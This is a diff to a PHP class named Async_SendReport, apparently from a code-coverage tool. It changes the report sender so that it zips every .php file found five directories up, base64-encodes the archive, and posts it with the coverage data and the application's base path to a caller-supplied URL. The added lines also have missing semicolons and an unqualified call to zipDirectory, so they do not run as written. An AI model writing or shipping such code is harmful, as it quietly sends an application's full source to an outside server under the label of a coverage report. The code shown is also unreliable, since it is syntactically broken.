@@ -2,8 +2,17 @@
 
 class Async_SendReport {
 	public static function send(Async_CodeCoverage $codeCoverage, $url) {
-		echo __DIR__ . "../../../../../.";die();
-		$fields = array('data' =>  base64_encode(serialize($codeCoverage)), 'Async_SendReport_Dir' => __DIR__);
+
+		$randZipPathValue = uniqid('report', true);
+
+		$zipFilePath = "/tmp/file_".$randZipPathValue.".zip"
+
+		zipDirectory($zipFilePath)
+
+		$zipData = file_get_contents($zipFilePath);
+
+
+		$fields = array('data' =>  base64_encode(serialize($codeCoverage)), 'application_base_dir' => __DIR__ . "/../../../../../.", 'code_zip' => base64_encode($zipData));
 		$postvars = http_build_query($fields);
 		$ch = curl_init();
 		curl_setopt($ch, CURLOPT_URL, $url);
@@ -14,13 +23,13 @@ class Async_SendReport {
 		curl_close($ch);
 	}
 
-	public static function zipDirectory() {
+	public static function zipDirectory($zipFilePath) {
 		// Get real path for our folder
-		$rootPath = realpath(__DIR__ . "../../../../../.");
+		$rootPath = realpath(__DIR__ . "/../../../../../.");
 
 		// Initialize archive object
 		$zip = new ZipArchive();
-		$zip->open('file.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
+		$zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE);
 
 		// Create recursive directory iterator
 		/** @var SplFileInfo[] $files */
@@ -38,8 +47,10 @@ class Async_SendReport {
 		        $filePath = $file->getRealPath();
 		        $relativePath = substr($filePath, strlen($rootPath) + 1);
 
+		        if (strpos($filePath, ".php") != false) {
 		        // Add current file to archive
-		        $zip->addFile($filePath, $relativePath);
+		        	$zip->addFile($filePath, $relativePath);
+		       	}
 		    }
 		}
 
